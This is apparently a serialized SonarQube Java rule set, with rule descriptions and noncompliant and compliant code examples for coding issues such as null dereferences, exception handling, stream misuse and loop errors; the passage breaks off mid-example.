javaS2121*Silly String operations should not be made"MAJOR*java:É<p>Creating a substring from 0 to the end is silly. You'll end up with the same string you started with. Using the value of <code>String.length</code>
as either the start or end of a substring has similarly predictable results.</p>
<p>Calling <code>String.contains</code> with the argument being identical to the String on which contains is invoked doesn't make sense.</p>
<h2>Noncompliant Code Example</h2>
<pre>
String speech = "Now is the time for all good people to come to the aid of their country.";

String s1 = speech.substring(0); // Noncompliant. Yields the whole string
String s2 = speech.substring(speech.length()); // Noncompliant. Yields "";
String s3 = speech.substring(5,speech.length()); // Noncompliant. Use the 1-arg version instead

if (speech.contains(speech)) { // Noncompliant
 // always true
}
</pre>
<h2>Compliant Solution</h2>
<pre>
String speech = "Now is the time for all good people to come to the aid of their country.";

String s1 = speech;
String s2 = "";
String s3 = speech.substring(5);
</pre>ZBUG
√

java:S2129¥
javaS2129qConstructors should not be used to instantiate "String", "BigInteger", "BigDecimal" and primitive-wrapper classes"MAJOR*java:ò<p>Constructors for <code>String</code>, <code>BigInteger</code>, <code>BigDecimal</code> and the objects used to wrap primitives should never be
used. Doing so is less clear and uses more memory than simply using the desired value in the case of strings, and using <code>valueOf</code> for
everything else.</p>
<h2>Noncompliant Code Example</h2>
<pre>
String empty = new String(); // Noncompliant; yields essentially "", so just use that.
String nonempty = new String("Hello world"); // Noncompliant
Double myDouble = new Double(1.1); // Noncompliant; use valueOf
Integer integer = new Integer(1); // Noncompliant
Boolean bool = new Boolean(true); // Noncompliant
BigInteger bigInteger1 = new BigInteger("3"); // Noncompliant
BigInteger bigInteger2 = new BigInteger("9223372036854775807"); // Noncompliant
BigInteger bigInteger3 = new BigInteger("111222333444555666777888999"); // Compliant, greater than Long.MAX_VALUE
</pre>
<h2>Compliant Solution</h2>
<pre>
String empty = "";
String nonempty = "Hello world";
Double myDouble = Double.valueOf(1.1);
Integer integer = Integer.valueOf(1);
Boolean bool = Boolean.valueOf(true);
BigInteger bigInteger1 = BigInteger.valueOf(3);
BigInteger bigInteger2 = BigInteger.valueOf(9223372036854775807L);
BigInteger bigInteger3 = new BigInteger("111222333444555666777888999");
</pre>
<h2>Exceptions</h2>
<p><code>BigDecimal</code> constructor with <code>double</code> argument is ignored as using <code>valueOf</code> instead might change resulting
value. See <a href='/coding_rules#rule_key=squid%3AS2111'>S2111</a>.</p>Z
CODE_SMELL
•

java:S1150ñ
javaS1150%Enumeration should not be implemented"MAJOR*java:∆<p>From the official Oracle Javadoc:</p>
<blockquote>
  <p>NOTE: The functionality of this Enumeration interface is duplicated by the Iterator interface. In addition, Iterator adds an optional remove
  operation, and has shorter method names. New implementations should consider using Iterator in preference to Enumeration.</p>
</blockquote>
<h2>Noncompliant Code Example</h2>
<pre>
public class MyClass implements Enumeration {  // Non-Compliant
  /* ... */
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public class MyClass implements Iterator {     // Compliant
  /* ... */
}
</pre>Z
CODE_SMELL
·

java:S1151“
javaS1151<"switch case" clauses should not have too many lines of code"MAJOR*java:Î<p>The <code>switch</code> statement should be used only to clearly define some new branches in the control flow. As soon as a <code>case</code>
clause contains too many statements this highly decreases the readability of the overall control flow statement. In such case, the content of the
<code>case</code> clause should be extracted into a dedicated method.</p>
<h2>Noncompliant Code Example</h2>
<p>With the default threshold of 5:</p>
<pre>
switch (myVariable) {
  case 0: // Noncompliant: 6 lines till next case
    methodCall1("");
    methodCall2("");
    methodCall3("");
    methodCall4("");
    break;
  case 1:
  ...
}
</pre>
<h2>Compliant Solution</h2>
<pre>
switch (myVariable) {
  case 0:
    doSomething()
    break;
  case 1:
  ...
}
...
private void doSomething(){
    methodCall1("");
    methodCall2("");
    methodCall3("");
    methodCall4("");
}
</pre>Z
CODE_SMELL
»

java:S2259π
javaS2259(Null pointers should not be dereferenced"MAJOR*java:Ì<p>A reference to <code>null</code> should never be dereferenced/accessed. Doing so will cause a <code>NullPointerException</code> to be thrown. At
best, such an exception will cause abrupt program termination. At worst, it could expose debugging information that would be useful to an attacker, or
it could allow an attacker to bypass security measures.</p>
<p>Note that when they are present, this rule takes advantage of <code>@CheckForNull</code> and <code>@Nonnull</code> annotations defined in <a
href="https://jcp.org/en/jsr/detail?id=305">JSR-305</a> to understand which values are and are not nullable except when <code>@Nonnull</code> is used
on the parameter to <code>equals</code>, which by contract should always work with null.</p>
<h2>Noncompliant Code Example</h2>
<pre>
@CheckForNull
String getName(){...}

public boolean isNameEmpty() {
  return getName().length() == 0; // Noncompliant; the result of getName() could be null, but isn't null-checked
}
</pre>
<pre>
Connection conn = null;
Statement stmt = null;
try{
  conn = DriverManager.getConnection(DB_URL,USER,PASS);
  stmt = conn.createStatement();
  // ...

}catch(Exception e){
  e.printStackTrace();
}finally{
  stmt.close();   // Noncompliant; stmt could be null if an exception was thrown in the try{} block
  conn.close();  // Noncompliant; conn could be null if an exception was thrown
}
</pre>
<pre>
private void merge(@Nonnull Color firstColor, @Nonnull Color secondColor){...}

public  void append(@CheckForNull Color color) {
    merge(currentColor, color);  // Noncompliant; color should be null-checked because merge(...) doesn't accept nullable parameters
}
</pre>
<pre>
void paint(Color color) {
  if(color == null) {
    System.out.println("Unable to apply color " + color.toString());  // Noncompliant; NullPointerException will be thrown
    return;
  }
  ...
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="http://cwe.mitre.org/data/definitions/476.html">MITRE, CWE-476</a> - NULL Pointer Dereference </li>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/PAw">CERT, EXP34-C.</a> - Do not dereference null pointers </li>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/ZwDOAQ">CERT, EXP01-J.</a> - Do not use a null in a case where an object is required
  </li>
</ul>ZBUG
∫

java:S1168´
javaS1168?Empty arrays and collections should be returned instead of null"MAJOR*java:¡<p>Returning <code>null</code> instead of an actual array or collection forces callers of the method to explicitly test for nullity, making them more
complex and less readable.</p>
<p>Moreover, in many cases, <code>null</code> is used as a synonym for empty.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public static List&lt;Result&gt; getResults() {
  return null;                             // Noncompliant
}

public static Result[] getResults() {
  return null;                             // Noncompliant
}

public static void main(String[] args) {
  Result[] results = getResults();

  if (results != null) {                   // Nullity test required to prevent NPE
    for (Result result: results) {
      /* ... */
    }
  }
}

</pre>
<h2>Compliant Solution</h2>
<pre>
public static List&lt;Result&gt; getResults() {
  return Collections.emptyList();          // Compliant
}

public static Result[] getResults() {
  return new Result[0];
}

public static void main(String[] args) {
  for (Result result: getResults()) {
    /* ... */
  }
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/AgG7AQ">CERT, MSC19-C.</a> - For functions that return an array, prefer returning an
  empty array over a null value </li>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/zwHEAw">CERT, MET55-J.</a> - Return an empty array or collection instead of a null
  value for methods that return an array or collection </li>
</ul>Z
CODE_SMELL
÷

java:S3346«
javaS3346<Expressions used in "assert" should not produce side effects"MAJOR*java:Á<p>Since <code>assert</code> statements aren't executed by default (they must be enabled with JVM flags) developers should never rely on their
execution the evaluation of any logic required for correct program function.</p>
<h2>Noncompliant Code Example</h2>
<pre>
assert myList.remove(myList.get(0));  // Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
boolean removed = myList.remove(myList.get(0));
assert removed;
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/vwG7AQ">CERT, EXP06-J.</a> - Expressions used in assertions must not produce side
  effects </li>
</ul>ZBUG
‹

java:S2133Õ
javaS21330Objects should not be created only to "getClass""MAJOR*java:Ú<p>Creating an object for the sole purpose of calling <code>getClass</code> on it is a waste of memory and cycles. Instead, simply use the class'
<code>.class</code> property.</p>
<h2>Noncompliant Code Example</h2>
<pre>
MyObject myOb = new MyObject();  // Noncompliant
Class c = myOb.getClass();
</pre>
<h2>Compliant Solution</h2>
<pre>
Class c = MyObject.class;
</pre>Z
CODE_SMELL
Œ

java:S1166ø
javaS1166:Exception handlers should preserve the original exceptions"MAJOR*java:⁄<p>When handling a caught exception, the original exception's message and stack trace should be logged or passed forward.</p>
<h2>Noncompliant Code Example</h2>
<pre>
try {
  /* ... */
} catch (Exception e) {   // Noncompliant - exception is lost
  LOGGER.info("context");
}

try {
  /* ... */
} catch (Exception e) {  // Noncompliant - exception is lost (only message is preserved)
  LOGGER.info(e.getMessage());
}

try {
  /* ... */
} catch (Exception e) {  // Noncompliant - original exception is lost
  throw new RuntimeException("context");
}
</pre>
<h2>Compliant Solution</h2>
<pre>
try {
  /* ... */
} catch (Exception e) {
  LOGGER.info(e);  // exception is logged
}

try {
  /* ... */
} catch (Exception e) {
  throw new RuntimeException(e);   // exception stack trace is propagated
}

try {
  /* ... */
} catch (RuntimeException e) {
  doSomething();
  throw e;  // original exception passed forward
} catch (Exception e) {
  throw new RuntimeException(e);  // Conversion into unchecked exception is also allowed
}
</pre>
<h2>Exceptions</h2>
<p><code>InterruptedException</code>, <code>NumberFormatException</code>, <code>DateTimeParseException</code>, <code>ParseException</code> and
<code>MalformedURLException</code> exceptions are arguably used to indicate nonexceptional outcomes. Similarly, handling
<code>NoSuchMethodException</code> is often required when dealing with the Java reflection API.</p>
<p>Because they are part of Java, developers have no choice but to deal with them. This rule does not verify that those particular exceptions are
correctly handled.</p>
<pre>
int myInteger;
try {
  myInteger = Integer.parseInt(myString);
} catch (NumberFormatException e) {
  // It is perfectly acceptable to not handle "e" here
  myInteger = 0;
}
</pre>
<p>Furthermore, no issue will be raised if the exception message is logged with additional information, as it shows that the developer added some
context to the error message.</p>
<pre>
try {
  /* ... */
} catch (Exception e) {
  String message = "Exception raised while authenticating user: " + e.getMessage();
  LOGGER.warn(message); // Compliant - exception message logged with some contextual information
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://www.owasp.org/index.php/Top_10-2017_A10-Insufficient_Logging%26Monitoring">OWASP Top 10 2017 Category A10</a> - Insufficient
  Logging &amp; Monitoring </li>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/6gEqAQ">CERT, ERR00-J.</a> - Do not suppress or ignore checked exceptions </li>
  <li> <a href="https://cwe.mitre.org/data/definitions/778.html">MITRE, CWE-778</a> - Insufficient Logging </li>
</ul>Z
CODE_SMELL
˜

java:S4551Ë
javaS4551(Enum values should be compared with "==""MAJOR*java:ï<p>Testing equality of an enum value with <code>equals</code> is perfectly valid because an enum is an Object and every Java developer knows "=="
should not be used to compare the content of an Object. At the same time, using "==" on enums:</p>
<p>- provides the same expected comparison (content) as <code>equals</code></p>
<p>- is more null-safe than equals()</p>
<p>- provides compile-time (static) checking rather than runtime checking</p>
<p>For these reasons, use of "==" should be preferred to <code>equals</code>.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public enum Fruit {
   APPLE, BANANA, GRAPE
}

public enum Cake {
  LEMON_TART, CHEESE_CAKE
}

public boolean isFruitGrape(Fruit candidateFruit) {
  return candidateFruit.equals(Fruit.GRAPE); // Noncompliant; this will raise an NPE if candidateFruit is NULL
}

public boolean isFruitGrape(Cake candidateFruit) {
  return candidateFruit.equals(Fruit.GRAPE); // Noncompliant; always returns false
}

</pre>
<h2>Compliant Solution</h2>
<pre>
public boolean isFruitGrape(Fruit candidateFruit) {
  return candidateFruit == Fruit.GRAPE; // Compliant; there is only one instance of Fruit.GRAPE - if candidateFruit is a GRAPE it will have the same reference as Fruit.GRAPE
}

public boolean isFruitGrape(Cake candidateFruit) {
  return candidateFruit == Fruit.GRAPE; // Compliant; compilation time failure
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://www.javaworld.com/article/2074292/core-java/use-----or-----to-compare-java-enums.html">Use == (or !=) to Compare Java
  Enums</a> </li>
</ul>Z
CODE_SMELL
û

java:S2134è
javaS2134CClasses extending java.lang.Thread should override the "run" method"MAJOR*java:®<p>According to the Java API documentation:</p>
<blockquote>
  <p>There are two ways to create a new thread of execution. One is to declare a class to be a subclass of Thread. This subclass should override the
  run method of class Thread. An instance of the subclass can then be allocated and started...</p>
  <p>The other way to create a thread is to declare a class that implements the Runnable interface. That class then implements the run method. An
  instance of the class can then be allocated, passed as an argument when creating Thread, and started.</p>
</blockquote>
<p>By definition, extending the Thread class without overriding the <code>run</code> method doesn't make sense, and implies that the contract of the
<code>Thread</code> class is not well understood.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public class MyRunner extends Thread { // Noncompliant; run method not overridden

  public void doSometing() {...}
}
</pre>
<h2>Exceptions</h2>
<p>If <code>run()</code> is not overridden in a class extending <code>Thread</code>, it means that starting the thread will actually call
<code>Thread.run()</code>. However, <code>Thread.run()</code> does nothing if it has not been fed with a target <code>Runnable</code>. The rule
consequently ignore classes extending <code>Thread</code> if they are calling, in their constructors, the <code>super(...)</code> constructor with a
proper <code>Runnable</code> target.</p>
<pre>
class MyThread extends Thread { // Compliant - calling super constructor with a Runnable
  MyThread(Runnable target) {
    super(target); // calling super constructor with a Runnable, which will be used for when Thread.run() is executed
    // ...
  }
}
</pre>ZBUG
ù

java:S2131é
javaS2131;Primitives should not be boxed just for "String" conversion"MAJOR*java:®<p>"Boxing" is the process of putting a primitive value into a primitive-wrapper object. When that's done purely to use the wrapper class'
<code>toString</code> method, it's a waste of memory and cycles because those methods are <code>static</code>, and can therefore be used without a
class instance. Similarly, using the <code>static</code> method <code>valueOf</code> in the primitive-wrapper classes with a non-<code>String</code>
argument should be avoided.</p>
<h2>Noncompliant Code Example</h2>
<pre>
int myInt = 4;
String myIntString = (new Integer(myInt)).toString(); // Noncompliant; creates &amp; discards an Integer object
myIntString = Integer.valueOf(myInt).toString(); // Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
int myInt = 4;
String myIntString = Integer.toString(myInt);
</pre>Z
CODE_SMELL
Ø

java:S2252†
javaS2252,Loop conditions should be true at least once"MAJOR*java:–<p>If a <code>for</code> loop's condition is false before the first loop iteration, the loop will never be executed. Such loops are almost always
bugs, particularly when the initial value and stop conditions are hard-coded.</p>
<h2>Noncompliant Code Example</h2>
<pre>
for (int i = 10; i &lt; 10; i++) {  // Noncompliant
  // ...
</pre>ZBUG
©

java:S2253ö
javaS2253 Track uses of disallowed methods"MAJOR*java:Õ<p>This rule allows banning certain methods.</p>
<h2>Noncompliant Code Example</h2>
<p>Given parameters:</p>
<ul>
  <li> className:java.lang.String </li>
  <li> methodName: replace </li>
  <li> argumentTypes: java.lang.CharSequence, java.lang.CharSequence </li>
</ul>
<pre>
String name;
name.replace("A","a");  // Noncompliant
</pre>@Z
CODE_SMELL
Í

java:S2139€
javaS2139;Exceptions should be either logged or rethrown but not both"MAJOR*java:ı<p>In applications where the accepted practice is to log an <code>Exception</code> and then rethrow it, you end up with miles-long logs that contain
multiple instances of the same exception. In multi-threaded applications debugging this type of log can be particularly hellish because messages from
other threads will be interwoven with the repetitions of the logged-and-thrown <code>Exception</code>. Instead, exceptions should be either logged or
rethrown, not both.</p>
<h2>Noncompliant Code Example</h2>
<pre>
catch (SQLException e) {
  ...
  LOGGER.log(Level.ERROR,  contextInfo, e);
  throw new MySQLException(contextInfo, e);
}
</pre>
<h2>Compliant Solution</h2>
<pre>
catch (SQLException e) {
  ...
  throw new MySQLException(contextInfo, e);
}
</pre>
<p>or </p>
<pre>
catch (SQLException e) {
  ...
  LOGGER.log(Level.ERROR,  contextInfo, e);
  // handle exception...
}
</pre>Z
CODE_SMELL
º

java:S1162≠
javaS1162'Checked exceptions should not be thrown"MAJOR*java:€<p>The purpose of checked exceptions is to ensure that errors will be dealt with, either by propagating them or by handling them, but some believe
that checked exceptions negatively impact the readability of source code, by spreading this error handling/propagation logic everywhere.</p>
<p>This rule verifies that no method throws a new checked exception.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public void myMethod1() throws CheckedException {
  ...
  throw new CheckedException(message);   // Noncompliant
  ...
  throw new IllegalArgumentException(message); // Compliant; IllegalArgumentException is unchecked
}

public void myMethod2() throws CheckedException {  // Compliant; propagation allowed
  myMethod1();
}
</pre>Z
CODE_SMELL
ñ

java:S1161á
javaS1161A"@Override" should be used on overriding and implementing methods"MAJOR*java:õ<p>Using the <code>@Override</code> annotation is useful for two reasons :</p>
<ul>
  <li> It elicits a warning from the compiler if the annotated method doesn't actually override anything, as in the case of a misspelling. </li>
  <li> It improves the readability of the source code by making it obvious that methods are overridden. </li>
</ul>
<h2>Noncompliant Code Example</h2>
<pre>
class ParentClass {
  public boolean doSomething(){...}
}
class FirstChildClass extends ParentClass {
  public boolean doSomething(){...}  // Noncompliant
}
</pre>
<h2>Compliant Solution</h2>
<pre>
class ParentClass {
  public boolean doSomething(){...}
}
class FirstChildClass extends ParentClass {
  @Override
  public boolean doSomething(){...}  // Compliant
}
</pre>
<h2>Exceptions</h2>
<p>This rule is relaxed when overriding a method from the <code>Object</code> class like <code>toString()</code>, <code>hashCode()</code>, ...</p>Z
CODE_SMELL
¯

java:S2251È
javaS2251IA "for" loop update clause should move the counter in the right direction"MAJOR*java:¸<p>A <code>for</code> loop with a counter that moves in the wrong direction is not an infinite loop. Because of wraparound, the loop will eventually
reach its stop condition, but in doing so, it will run many, many more times than anticipated, potentially causing unexpected behavior. </p>
<h2>Noncompliant Code Example</h2>
<pre>
public void doSomething(String [] strings) {
  for (int i = 0; i &lt; strings.length; i--) { // Noncompliant;
    String string = strings[i];  // ArrayIndexOutOfBoundsException when i reaches -1
    //...
  }
</pre>
<h2>Compliant Solution</h2>
<pre>
public void doSomething(String [] strings) {
  for (int i = 0; i &lt; strings.length; i++) {
    String string = strings[i];
    //...
  }
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/zYEzAg">CERT, MSC54-J.</a> - Avoid inadvertent wrapping of loop counters </li>
</ul>ZBUG
´

java:S1160ú
javaS11609Public methods should throw at most one checked exception"MAJOR*java:∏<p>Using checked exceptions forces method callers to deal with errors, either by propagating them or by handling them. Throwing exceptions makes them
fully part of the API of the method.</p>
<p>But to keep the complexity for callers reasonable, methods should not throw more than one kind of checked exception.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public void delete() throws IOException, SQLException {      // Noncompliant
  /* ... */
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public void delete() throws SomeApplicationLevelException {
  /* ... */
}
</pre>
<h2>Exceptions</h2>
<p>Overriding methods are not checked by this rule and are allowed to throw several checked exceptions.</p>Z
CODE_SMELL
à

java:S2864˘
javaS2864F"entrySet()" should be iterated when both the key and value are needed"MAJOR*java:à<p>When only the keys from a map are needed in a loop, iterating the <code>keySet</code> makes sense. But when both the key and the value are needed,
it's more efficient to iterate the <code>entrySet</code>, which will give access to both the key and value, instead.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public void doSomethingWithMap(Map&lt;String,Object&gt; map) {
  for (String key : map.keySet()) {  // Noncompliant; for each key the value is retrieved
    Object value = map.get(key);
    // ...
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public void doSomethingWithMap(Map&lt;String,Object&gt; map) {
  for (Map.Entry&lt;String,Object&gt; entry : map.entrySet()) {
    String key = entry.getKey();
    Object value = entry.getValue();
    // ...
  }
}
</pre>Z
CODE_SMELL
á

java:S1774¯
javaS1774'The ternary operator should not be used"MAJOR*java:¶<p>While the ternary operator is pleasingly compact, its use can make code more difficult to read. It should therefore be avoided in favor of the more
verbose <code>if</code>/<code>else</code> structure.</p>
<h2>Noncompliant Code Example</h2>
<pre>
System.out.println(i&gt;10?"yes":"no");
</pre>
<h2>Compliant Solution</h2>
<pre>
if (i &gt; 10) {
  System.out.println(("yes");
} else {
  System.out.println("no");
}
</pre>Z
CODE_SMELL
ﬂ

java:S2629–
javaS2629C"Preconditions" and logging arguments should not require evaluation"MAJOR*java:‚<p>Passing message arguments that require further evaluation into a Guava <code>com.google.common.base.Preconditions</code> check can result in a
performance penalty. That's because whether or not they're needed, each argument must be resolved before the method is actually called.</p>
<p>Similarly, passing concatenated strings into a logging method can also incur a needless performance hit because the concatenation will be performed
every time the method is called, whether or not the log level is low enough to show the message.</p>
<p>Instead, you should structure your code to pass static or pre-computed values into <code>Preconditions</code> conditions check and logging
calls.</p>
<p>Specifically, the built-in string formatting should be used instead of string concatenation, and if the message is the result of a method call,
then <code>Preconditions</code> should be skipped altoghether, and the relevant exception should be conditionally thrown instead.</p>
<h2>Noncompliant Code Example</h2>
<pre>
logger.log(Level.DEBUG, "Something went wrong: " + message);  // Noncompliant; string concatenation performed even when log level too high to show DEBUG messages

logger.fine("An exception occurred with message: " + message); // Noncompliant

LOG.error("Unable to open file " + csvPath, e);  // Noncompliant

Preconditions.checkState(a &gt; 0, "Arg must be positive, but got " + a);  // Noncompliant. String concatenation performed even when a &gt; 0

Preconditions.checkState(condition, formatMessage());  // Noncompliant. formatMessage() invoked regardless of condition

Preconditions.checkState(condition, "message: %s", formatMessage());  // Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
logger.log(Level.SEVERE, "Something went wrong: {0} ", message);  // String formatting only applied if needed

logger.fine("An exception occurred with message: {}", message);  // SLF4J, Log4j

logger.log(Level.SEVERE, () -&gt; "Something went wrong: " + message); // since Java 8, we can use Supplier , which will be evaluated lazily

LOG.error("Unable to open file {0}", csvPath, e);

if (LOG.isDebugEnabled() {
  LOG.debug("Unable to open file " + csvPath, e);  // this is compliant, because it will not evaluate if log level is above debug.
}

Preconditions.checkState(arg &gt; 0, "Arg must be positive, but got %d", a);  // String formatting only applied if needed

if (!condition) {
  throw new IllegalStateException(formatMessage());  // formatMessage() only invoked conditionally
}

if (!condition) {
  throw new IllegalStateException("message: " + formatMessage());
}
</pre>
<h2>Exceptions</h2>
<p><code>catch</code> blocks are ignored, because the performance penalty is unimportant on exceptional paths (catch block should not be a part of
standard program flow). Getters are ignored as well as methods called on annotations which can be considered as getters. This rule accounts for
explicit test-level testing with SLF4J methods <code>isXXXEnabled</code> and ignores the bodies of such <code>if</code> statements.</p>Z
CODE_SMELL
Ó	

java:S3958ﬂ	
javaS39585Intermediate Stream methods should not be left unused"MAJOR*java:Ü	<p>There are two types of stream operations: intermediate operations, which return another stream, and terminal operations, which return something
other than a stream. Intermediate operations are lazy, meaning they aren't actually executed until and unless a terminal stream operation is performed
on their results. Consequently if the result of an intermediate stream operation is not fed to a terminal operation, it serves no purpose, which is
almost certainly an error.</p>
<h2>Noncompliant Code Example</h2>
<pre>
widgets.stream().filter(b -&gt; b.getColor() == RED); // Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
int sum = widgets.stream()
                      .filter(b -&gt; b.getColor() == RED)
                      .mapToInt(b -&gt; b.getWeight())
                      .sum();
Stream&lt;Widget&gt; pipeline = widgets.stream()
                                 .filter(b -&gt; b.getColor() == GREEN)
                                 .mapToInt(b -&gt; b.getWeight());
sum = pipeline.sum();
</pre>
<h2>See</h2>
<p><a href="https://docs.oracle.com/javase/8/docs/api/java/util/stream/package-summary.html#StreamOps">Stream Operations</a></p>ZBUG
Ú

java:S3959„
javaS3959.Consumed Stream pipelines should not be reused"MAJOR*java:ë<p>Stream operations are divided into intermediate and terminal operations, and are combined to form stream pipelines. After the terminal operation is
performed, the stream pipeline is considered consumed, and cannot be used again. Such a reuse will yield unexpected results.</p>
<h2>Noncompliant Code Example</h2>
<pre>
Stream&lt;Widget&gt; pipeline = widgets.stream().filter(b -&gt; b.getColor() == RED);
int sum1 = pipeline.sum();
int sum2 = pipeline.mapToInt(b -&gt; b.getWeight()).sum(); // Noncompliant
</pre>
<h2>See</h2>
<p><a href="https://docs.oracle.com/javase/8/docs/api/java/util/stream/package-summary.html#StreamOps">Stream Operations</a></p>ZBUG
Ù

java:S4925Â
javaS49253"Class.forName()" should not load JDBC 4.0+ drivers"MAJOR*java:á<p>In the past, it was required to load a JDBC driver before creating a <code>java.sql.Connection</code>. Nowadays, when using JDBC 4.0 drivers, this
is no longer required and <code>Class.forName()</code> can be safely removed because JDBC 4.0 (JDK 6) drivers available in the classpath are
automatically loaded.</p>
<p>This rule raises an issue when <code>Class.forName()</code> is used with one of the following values:</p>
<ul>
  <li> <code>com.mysql.jdbc.Driver</code> </li>
  <li> <code>oracle.jdbc.driver.OracleDriver</code> </li>
  <li> <code>com.ibm.db2.jdbc.app.DB2Driver</code> </li>
  <li> <code>com.ibm.db2.jdbc.net.DB2Driver</code> </li>
  <li> <code>com.sybase.jdbc.SybDriver</code> </li>
  <li> <code>com.sybase.jdbc2.jdbc.SybDriver</code> </li>
  <li> <code>com.teradata.jdbc.TeraDriver</code> </li>
  <li> <code>com.microsoft.sqlserver.jdbc.SQLServerDriver</code> </li>
  <li> <code>org.postgresql.Driver</code> </li>
  <li> <code>sun.jdbc.odbc.JdbcOdbcDriver</code> </li>
  <li> <code>org.hsqldb.jdbc.JDBCDriver</code> </li>
  <li> <code>org.h2.Driver</code> </li>
  <li> <code>org.firebirdsql.jdbc.FBDriver</code> </li>
  <li> <code>net.sourceforge.jtds.jdbc.Driver</code> </li>
</ul>
<h2>Noncompliant Code Example</h2>
<pre>
import java.sql.Connection;
import java.sql.DriverManager;
import java.sql.SQLException;

public class Demo {
  private static final String DRIVER_CLASS_NAME = "org.postgresql.Driver";
  private final Connection connection;

  public Demo(String serverURI) throws SQLException, ClassNotFoundException {
    Class.forName(DRIVER_CLASS_NAME); // Noncompliant; no longer required to load the JDBC Driver using Class.forName()
    connection = DriverManager.getConnection(serverURI);
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
import java.sql.Connection;
import java.sql.DriverManager;
import java.sql.SQLException;

public class Demo {
    private final Connection connection;

    public Demo(String serverURI) throws SQLException {
        connection = DriverManager.getConnection(serverURI);
    }
}
</pre>Z
CODE_SMELL
π

java:S1656™
javaS1656%Variables should not be self-assigned"MAJOR*java:·<p>There is no reason to re-assign a variable to itself. Either this statement is redundant and should be removed, or the re-assignment is a mistake
and some other value or variable was intended for the assignment instead.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public void setName(String name) {
  name = name;
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public void setName(String name) {
  this.name = name;
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/NYA5">CERT, MSC12-C.</a> - Detect and remove code that has no effect or is never
  executed </li>
</ul>ZBUG
	

java:S2639·	
javaS26394Inappropriate regular expressions should not be used"MAJOR*java:â	<p>Regular expressions are powerful but tricky, and even those long used to using them can make mistakes.</p>
<p>The following should not be used as regular expressions:</p>
<ul>
  <li> <code>.</code> - matches any single character. Used in <code>replaceAll</code>, it matches <em>everything</em> </li>
  <li> <code>|</code> - normally used as an option delimiter. Used stand-alone, it matches the space between characters </li>
  <li> <code>File.separator</code> - matches the platform-specific file path delimiter. On Windows, this will be taken as an escape character </li>
</ul>
<h2>Noncompliant Code Example</h2>
<pre>
String str = "/File|Name.txt";

String clean = str.replaceAll(".",""); // Noncompliant; probably meant to remove only dot chars, but returns an empty string
String clean2 = str.replaceAll("|","_"); // Noncompliant; yields _/_F_i_l_e_|_N_a_m_e_._t_x_t_
String clean3 = str.replaceAll(File.separator,""); // Noncompliant; exception on Windows

String clean4 = str.replaceFirst(".",""); // Noncompliant;
String clean5 = str.replaceFirst("|","_"); // Noncompliant;
String clean6 = str.replaceFirst(File.separator,""); // Noncompliant;
</pre>ZBUG
à

java:S2757˘
javaS2757'"=+" should not be used instead of "+=""MAJOR*java:Æ<p>The use of operators pairs ( <code>=+</code>, <code>=-</code> or <code>=!</code> ) where the reversed, single operator was meant (<code>+=</code>,
<code>-=</code> or <code>!=</code>) will compile and run, but not produce the expected results.</p>
<p>This rule raises an issue when <code>=+</code>, <code>=-</code>, or <code>=!</code> is used without any spacing between the two operators and when
there is at least one whitespace character after.</p>
<h2>Noncompliant Code Example</h2>
<pre>
int target = -5;
int num = 3;

target =- num;  // Noncompliant; target = -3. Is that really what's meant?
target =+ num; // Noncompliant; target = 3
</pre>
<h2>Compliant Solution</h2>
<pre>
int target = -5;
int num = 3;

target = -num;  // Compliant; intent to assign inverse value of num is clear
target += num;
</pre>ZBUG
ñ

java:S3725á
javaS3725*Java 8's "Files.exists" should not be used"MAJOR*java:≤<p>The <code>Files.exists</code> method has noticeably poor performance in JDK 8, and can slow an application significantly when used to check files
that don't actually exist. </p>
<p>The same goes for <code>Files.notExists</code>, <code>Files.isDirectory</code> and <code>Files.isRegularFile</code>.</p>
<p><strong>Note</strong> that this rule is automatically disabled when the project's <code>sonar.java.source</code> is not 8.</p>
<h2>Noncompliant Code Example</h2>
<pre>
Path myPath;
if(java.nio.Files.exists(myPath)) {  // Noncompliant
 // do something
}
</pre>
<h2>Compliant Solution</h2>
<pre>
Path myPath;
if(myPath.toFile().exists())) {
 // do something
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://bugs.openjdk.java.net/browse/JDK-8153414">https://bugs.openjdk.java.net/browse/JDK-8153414</a> </li>
  <li> <a href="https://bugs.openjdk.java.net/browse/JDK-8154077">https://bugs.openjdk.java.net/browse/JDK-8154077</a> </li>
</ul>Z
CODE_SMELL
∂	

java:S1751ß	
javaS17515Loops with at most one iteration should be refactored"MAJOR*java:Œ<p>A loop with at most one iteration is equivalent to the use of an <code>if</code> statement to conditionally execute one piece of code. No developer
expects to find such a use of a loop statement. If the initial intention of the author was really to conditionally execute one piece of code, an
<code>if</code> statement should be used instead.</p>
<p>At worst that was not the initial intention of the author and so the body of the loop should be fixed to use the nested <code>return</code>,
<code>break</code> or <code>throw</code> statements in a more appropriate way.</p>
<h2>Noncompliant Code Example</h2>
<pre>
for (int i = 0; i &lt; 10; i++) { // noncompliant, loop only executes once
  printf("i is %d", i);
  break;
}
...
for (int i = 0; i &lt; 10; i++) { // noncompliant, loop only executes once
  if(i == x) {
    break;
